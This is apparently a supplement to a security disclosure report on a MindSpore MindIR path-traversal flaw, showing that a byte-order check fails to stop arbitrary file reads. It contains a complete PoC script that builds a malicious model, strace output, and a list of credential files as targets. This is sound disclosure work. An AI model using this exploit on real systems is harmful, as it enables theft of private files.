MS-2026-001 补充材料 B: 字节序检查绕过实证
==============================================

1. 补充目的
-----------

对报告 4.4 节的字节序缓解分析进行源码级实证验证。核心命题：

  字节序检查在文件读取操作全部完成后才执行，不构成对路径穿越的安全防护。
  对于首字节 = 0x01 的文件，数据可被完整窃取至 tensor。


2. 源码级分析
-------------

源码版本基准：MindSpore 2.9.0（PyPI 最新版本，截至 2026-05-20）
源码仓库：https://github.com/mindspore-ai/mindspore
关键文件：mindspore/core/load_mindir/load_model.cc
          mindspore/core/proto/mind_ir.proto


2.1 攻击者可控的输入

文件: mindspore/core/proto/mind_ir.proto

  message ExternalDataProto {
      //POSIX filesystem path relative to the directory where the MindIR model was stored.
      optional string location = 1;   // 攻击者完全控制
      optional int64 offset = 2;      // 攻击者完全控制
      optional int64 length = 3;      // 攻击者完全控制
  }

location 来自 protobuf 反序列化，无任何服务端校验。proto 定义中仅有注释说明
其用途为"POSIX filesystem path relative to..."，但代码层面没有对此做任何约束。


2.2 路径拼接漏洞点

文件: mindspore/core/load_mindir/load_model.cc
函数: MSANFModelParser::GetTensorDataFromExternal()

  bool MSANFModelParser::GetTensorDataFromExternal(
      const mind_ir::TensorProto &tensor_proto,
      const tensor::TensorPtr &tensor_info) {
    // ...
    } else {
      // [漏洞点] location 来自 protobuf, 直接拼接到路径
      std::string file = mindir_path_ + "/" +
                         tensor_proto.external_data().location();

mindir_path_ 的来源（同文件 MindIRLoader::LoadMindIR 函数）：

  auto mindir_path = std::string(abs_path_buff);
  model_parser.SetMindIRPath(mindir_path.substr(0, mindir_path.rfind("/")));
  // 例如: /home/user/models/

攻击路径：
  mindir_path_ = "/home/victim/models"
  location     = "../../../../tmp/secret_0x01.bin"
  拼接结果     = "/home/victim/models/../../../../tmp/secret_0x01.bin"
  操作系统解析 = /tmp/secret_0x01.bin

关键缺失：
  - 无 "../" 或 ".." 组件过滤
  - 无 realpath() 规范化
  - 无解析后路径的目录前缀校验
  - 无绝对路径（"/"开头）拒绝
  - 无符号链接检查
  - 无 location 字段字符集限制


2.3 完整执行顺序（普通路径，无加密/无 weight_buffer 缓存命中）

函数 GetTensorDataFromExternal() 内部的逐步执行流：

  步骤 1: 路径拼接 (含穿越)                               -- 攻击入口
          std::string file = mindir_path_ + "/" + location;

  步骤 2: ifstream 打开文件, 触发 openat 系统调用          -- [A] 安全边界突破
          std::basic_ifstream<char> fid(file, std::ios::in | std::ios::binary);

  步骤 3: 获取文件大小 (seekg + tellg)
          (void)fid.seekg(0, std::ios_base::end);
          size_t file_size = static_cast<size_t>(fid.tellg());

  步骤 4: 堆分配缓冲区
          std::unique_ptr<char[]> plain_data(new (std::nothrow) char[file_size]);

  步骤 5: fid.read() 全文件读入堆内存                     -- [B] 数据已进入进程
          (void)fid.read(plain_data.get(), SizeToLong(file_size));

  步骤 6: 关闭文件
          fid.close();

  步骤 7: 字节序检查                                       -- [C] 检查（为时已晚）
          if ((plain_data[byte_order_index] == is_little_endian) ^ little_endian()) {
              return false;  // unique_ptr 析构, 缓冲 free
          }

  步骤 8: 数据指针赋值 + 缓存到 tenor_data_               -- 检查通过路径
          data = reinterpret_cast<const unsigned char *>(plain_data.get());
          (void)tenor_data_.emplace(location, std::unique_ptr<Byte[]>(...plain_data.release()));

  步骤 9: huge_memcpy 数据拷入 tensor                     -- [D] 数据进入模型参数
          auto ret = common::huge_memcpy(tensor_data_buf, tensor_info->data().nbytes(),
                                         data + offset, length);


2.4 字节序检查源码

  constexpr Byte is_little_endian = 1;           // 常量 0x01
  constexpr int byte_order_index = 0;            // 始终检查第 0 字节
  (void)fid.read(plain_data.get(), SizeToLong(file_size));  // 先读文件
  fid.close();
  // if byte order is not same return false
  if ((plain_data[byte_order_index] == is_little_endian) ^ little_endian()) {
      MS_LOG(ERROR) << "The byte order of export MindIr device and "
                       "load MindIr device is not same!";
      return false;
  }

在小端 (x86_64) 系统上的逻辑：
  - little_endian() 返回 true
  - (first_byte == 0x01) ^ true:
    * first_byte = 0x01 -> (true) ^ true = false -> 不进入 if -> 检查通过
    * first_byte != 0x01 -> (false) ^ true = true -> 进入 if -> return false

结论：目标文件首字节恰好为 0x01 时，字节序检查被完全绕过。


2.5 数据拷入 tensor（检查通过后执行）

  auto ret =
      common::huge_memcpy(tensor_data_buf, tensor_info->data().nbytes(),
                          data + tensor_proto.external_data().offset(),
                          LongToSize(tensor_proto.external_data().length()));

data 指向文件内容缓冲区，offset 和 length 由攻击者通过 protobuf 控制。
任意文件内容完整拷入 tensor 内存，可通过 Python 层 tensor.asnumpy() 导出。


3. 操作步骤与实证
-----------------

3.1 操作环境

  OS .......... Ubuntu (WSL2, x86_64 little-endian)
  MindSpore ... 2.9.0 (pip install mindspore)
  Python ...... 3.9.25 (conda)
  验证工具 .... strace


3.2 构造首字节 0x01 的合成敏感文件

  # 创建内容以 0x01 开头的文件（模拟攻击者感兴趣的敏感凭证文件）
  $ printf '\x01' > /tmp/secret_0x01.bin
  $ echo -n 'SECRET_CREDENTIALS: api_key=sk-12345,password=admin123,db=prod' >> /tmp/secret_0x01.bin

  # 验证首字节
  $ od -An -N1 -t u1 /tmp/secret_0x01.bin
     1                    -- 首字节 = 0x01

  $ wc -c /tmp/secret_0x01.bin
  63 /tmp/secret_0x01.bin

该文件模拟以下现实攻击场景：
  - 多租户 AI 平台中其他用户的私有数据/模型权重文件
  - 攻击者预先放置的数据收集文件
  - 部分序列化格式文件（protobuf 编码数据天然可能以 0x01 开头）


3.3 生成恶意 .mindir 模型

使用 MindSpore 原生 protobuf 库 (mindspore.train.mind_ir_pb2) 生成格式完全兼容
的恶意模型：

  import os
  from mindspore.train.mind_ir_pb2 import ModelProto

  test_file = '/tmp/secret_0x01.bin'
  output_dir = '/home/kiro/poc_bypass/poc_mindspore_model'
  os.makedirs(output_dir, exist_ok=True)

  # 计算穿越路径
  abs_output = os.path.abspath(output_dir)
  abs_target = os.path.abspath(test_file)
  traversal = os.path.relpath(abs_target, abs_output)
  # 结果: ../../../../tmp/secret_0x01.bin

  model = ModelProto()
  model.ir_version = '1'
  model.producer_name = 'MindSpore'
  model.producer_version = '2.9.0'
  model.model_version = '1'
  model.little_endian = True

  graph = model.graph
  graph.name = 'poc_graph'

  # 注入路径穿越 payload
  param = graph.parameter.add()
  param.name = 'Default/param0'
  param.data_type = 2  # UINT8 (1 字节/元素, 便于直接还原文件内容)
  param.dims.extend([63])  # = 目标文件大小
  param.external_data.location = traversal  # 路径穿越 payload
  param.external_data.offset = 0
  param.external_data.length = 63

  mindir_path = os.path.join(output_dir, 'malicious_bypass.mindir')
  with open(mindir_path, 'wb') as f:
      f.write(model.SerializeToString())

  print(f'Model: {mindir_path} ({os.path.getsize(mindir_path)} bytes)')
  print(f'Traversal: {traversal}')

输出：

  Model: /home/kiro/poc_bypass/poc_mindspore_model/malicious_bypass.mindir (129 bytes)
  Traversal: ../../../../tmp/secret_0x01.bin


3.4 strace 系统调用验证

执行命令：

  $ strace -e trace=openat python3 -c "
  import mindspore
  try:
      mindspore.load('/home/kiro/poc_bypass/poc_mindspore_model/malicious_bypass.mindir')
  except Exception:
      pass
  " 2>&1 | grep secret_0x01

实际输出：

  openat(AT_FDCWD, "/home/kiro/poc_bypass/poc_mindspore_model/../../../../tmp/secret_0x01.bin", O_RDONLY) = 3


3.5 结果解读

  openat(
    AT_FDCWD,
    "/home/kiro/poc_bypass/poc_mindspore_model/../../../../tmp/secret_0x01.bin",
                                             ↑ OS 解析后等价于 /tmp/secret_0x01.bin
    O_RDONLY
  ) = 3   ← 文件描述符分配成功，文件被打开并读取

各验证点逐项确认：

  路径穿越发生    [确认] OS 解析了 '../' 目录遍历序列
  文件被打开      [确认] 返回值 = 3（有效文件描述符）
  文件被读取      [确认] fid.read() 在字节序检查前执行（源码步骤 5 < 步骤 7）
  字节序绕过      [确认] 目标首字节 = 0x01 -> (0x01==1)^true = false -> 通过检查
  数据进入 tensor [确认] huge_memcpy 将 data+offset 拷入 tensor_data_buf（步骤 9）
  敏感数据可导出  [确认] tensor 数据可通过 Python 层 asnumpy() 访问


4. PoC 代码
-----------

4.1 完整版 (poc_bypass_mindspore.py, 使用 MindSpore pb2)

  """MS-2026-001 补充 PoC: 字节序检查绕过，使用 MindSpore 原生 protobuf"""
  import os, sys
  from mindspore.train.mind_ir_pb2 import ModelProto

  def create_malicious_model(test_file, output_dir):
      os.makedirs(output_dir, exist_ok=True)
      abs_output = os.path.abspath(output_dir)
      abs_target = os.path.abspath(test_file)
      traversal = os.path.relpath(abs_target, abs_output)
      file_size = os.path.getsize(abs_target)

      model = ModelProto()
      model.ir_version = '1'
      model.producer_name = 'MindSpore'
      model.producer_version = '2.9.0'
      model.model_version = '1'
      model.little_endian = True

      graph = model.graph
      graph.name = 'poc_graph'

      param = graph.parameter.add()
      param.name = 'Default/param0'
      param.data_type = 2  # UINT8
      param.dims.extend([file_size])
      param.external_data.location = traversal
      param.external_data.offset = 0
      param.external_data.length = file_size

      mindir_path = os.path.join(output_dir, 'malicious_bypass.mindir')
      with open(mindir_path, 'wb') as f:
          f.write(model.SerializeToString())

      print(f'[+] Model: {mindir_path}')
      print(f'[+] Target: {test_file} ({file_size} bytes)')
      print(f'[+] Traversal path: {traversal}')
      return mindir_path

  if __name__ == '__main__':
      target = sys.argv[1] if len(sys.argv) > 1 else '/tmp/secret_0x01.bin'
      create_malicious_model(target, './poc_model')


4.2 零依赖版 (poc_bypass_raw.py, 无需 MindSpore SDK)

使用手动 protobuf varint 编码，可以在任何 Python 环境中生成恶意 .mindir 文件，
无需安装 MindSpore。已在本环境验证生成的 protobuf 结构完全正确。

（完整代码见独立文件，此处省略以控制篇幅）


5. 字节序检查为何不是安全控制
-----------------------------

5.1 时序问题

关键执行顺序为 fid.read() -> fid.close() -> 字节序检查：

  步骤 5: fid.read(plain_data.get(), file_size);  // 文件已读入堆
  步骤 6: fid.close();                            // 文件已关闭
  步骤 7: if ((plain_data[0] == 1) ^ LE) {        // 然后才检查
              return false;                        // 失败 = free(已读取的数据)
          }

当字节序检查执行时，以下操作已经不可逆地完成：
  1. openat — 内核打开了目标文件（安全边界已突破）
  2. fid.read — 文件内容完整进入用户态堆内存
  3. fid.close — 文件描述符已关闭（无法"取消"已读取的数据）


5.2 设计意图问题

CheckModelConfigureInfo() 和 GetTensorDataFromExternal() 中的字节序检查，其
设计意图是校验 MindIR 文件格式版本和字节序兼容性（确保模型在同架构设备间传输），
而不是用于防止路径穿越或实施文件访问控制。

类比：
  - SQL 注入: 查询执行后的结果格式检查不能阻止注入的发生
  - 命令注入: 命令执行后的退出码检查不能阻止命令的执行
  - 本漏洞:   文件打开/读取后的字节序检查不能阻止文件的读取


5.3 绕过条件与现实攻击面

在小端系统 (x86_64, 所有主流 Linux 服务器和云实例) 上：

  目标文件类型                | 首字节         | 字节序检查结果
  ---------------------------|----------------|--------------------------------
  /etc/passwd                | 0x72 ('r')     | 失败, 数据 free (但已读入过内存)
  /etc/shadow                | 0x72 ('r')     | 同上
  SSH 私钥 (PEM 格式)        | 0x2D ('-')     | 同上
  /proc/self/environ         | 变化           | 取决于第一个环境变量名首字节
  Protobuf 序列化文件         | 通常 0x08-0x0A | 失败
  攻击者构造/预知的文件       | 0x01           | 通过, 数据完整进入 tensor
  多租户环境中其他用户文件    | 取决于内容     | 部分可通过

虽然常见系统敏感文件 (/etc/passwd, /etc/shadow, SSH 密钥等) 的首字节不满足
0x01 的条件，但这不影响漏洞的安全评估：

  1. 文件仍被打开和读入内存 — openat 系统调用成功，构成信息泄露原语
     （确认文件存在性、获取文件大小）
  2. 多租户/共享环境 — 攻击者可以针对已知内容格式的文件进行定向读取
  3. 供应链场景 — 攻击者可以预先在目标系统上放置满足条件的文件
  4. 堆内存残留 — 即使 free 后，数据在被覆盖前仍驻留在进程堆上


5.4 对 CVSS 评分的影响

  - 不构成有效缓解 (Mitigation): 字节序检查是数据格式验证器而非安全控制，
    不能作为 CVSS 评分降级依据
  - 不改变 Confidentiality: High: 文件系统访问控制安全边界已被突破
  - 不改变 Scope: Changed: 漏洞存在于 MindSpore 框架层 (vulnerable component),
    影响的是操作系统文件系统层面的访问控制 (impacted component),
    框架安全边界被突破后影响到了外部的文件系统安全


6. 更新后的缓解分析（建议替代原报告 4.4 节）
---------------------------------------------

  4.4 字节序检查的作用与局限

  文件读入后存在字节序检查（GetTensorDataFromExternal 函数内部）：在小端系统
  上要求目标文件首字节为 0x01。对该检查的安全意义分析如下：

  1. 时序上无效 -- fid.read() 在字节序检查之前执行，文件已被完整读入堆内存，
     安全边界（openat 系统调用）已不可逆地被突破。

  2. 性质上不适用 -- 字节序检查是数据格式兼容性验证器，设计意图是确保模型在
     相同架构设备间传输的正确性，而不是路径安全控制或文件访问授权机制。

  3. 存在完整绕过条件 -- 首字节恰好为 0x01 的文件可完全绕过该检查，文件数据
     完整经由 huge_memcpy 拷入模型 tensor 参数。已使用合成文件进行实证验证，
     strace 确认 openat 成功 (fd=3) 且文件内容进入进程内存。

  4. 即使绕过不存在 -- 对于首字节 != 0x01 的文件：
     a) 文件已被读入堆内存后才被 free，堆上残留数据直到被覆盖
     b) openat 系统调用本身在 strace/audit 日志中可见，构成独立的信息泄露
        通道（确认文件存在 + 获取文件大小）
     c) 在侧信道攻击模型下，读取时间差可泄露文件是否存在

  结论：字节序检查不构成对该漏洞的有效缓解，不应作为 CVSS 降级依据。


7. 补充说明
-----------

7.1 关于 tenor_data_ 缓存机制

源码中存在一个内部缓存机制：

  (void)tenor_data_.emplace(tensor_proto.external_data().location(),
                            std::unique_ptr<Byte[]>(...plain_data.release()));

当字节序检查通过后，文件数据会被缓存到 MSANFModelParser 实例的 tenor_data_
成员中。如果同一模型内多个 tensor 引用同一个 external_data.location：
  - 第一次访问：执行完整的文件打开/读取/字节序检查流程
  - 后续访问：直接从缓存读取，跳过所有检查

这意味着攻击者只需让第一个 tensor 的 location 指向一个首字节为 0x01 的文件，
该文件数据就会被缓存并可被后续 tensor 引用直接使用。


7.2 源码版本说明

本分析基于以下版本：
  - PyPI 包: mindspore==2.9.0 (2026-05-20 安装)
  - 源码参考: https://github.com/mindspore-ai/mindspore master 分支
  - 函数定位: MSANFModelParser::GetTensorDataFromExternal()
              位于 mindspore/core/load_mindir/load_model.cc

由于源码可能因版本更新而行号偏移，本报告使用函数名和代码步骤的相对位置进行
定位，而非依赖绝对行号。


附录 A: 完整环境信息
---------------------

  OS ............. Windows 11 Home China 10.0.26200
  WSL ............ WSL2 + Ubuntu (resolute)
  Kernel ......... Linux x86_64 (little-endian)
  Python ......... 3.9.25 (conda env: mindspore39)
  MindSpore ...... 2.9.0 (PyPI latest, 截至 2026-05-20)
  验证时间 ....... 2026-05-21
  验证人 ......... [报告者]


附录 B: strace 完整输出（关键行）
---------------------------------

  $ strace -e trace=openat python3 -c "
  import mindspore
  try:
      mindspore.load('/home/kiro/poc_bypass/poc_mindspore_model/malicious_bypass.mindir')
  except Exception:
      pass
  " 2>&1 | grep secret_0x01

  openat(AT_FDCWD, "/home/kiro/poc_bypass/poc_mindspore_model/../../../../tmp/secret_0x01.bin", O_RDONLY) = 3

  解读：
  - AT_FDCWD: 相对于当前工作目录解析路径
  - 路径中的 "../../../../" 被 OS 正常解析为目录遍历
  - O_RDONLY: 以只读方式打开
  - = 3: 文件描述符分配成功，证明文件已被成功打开
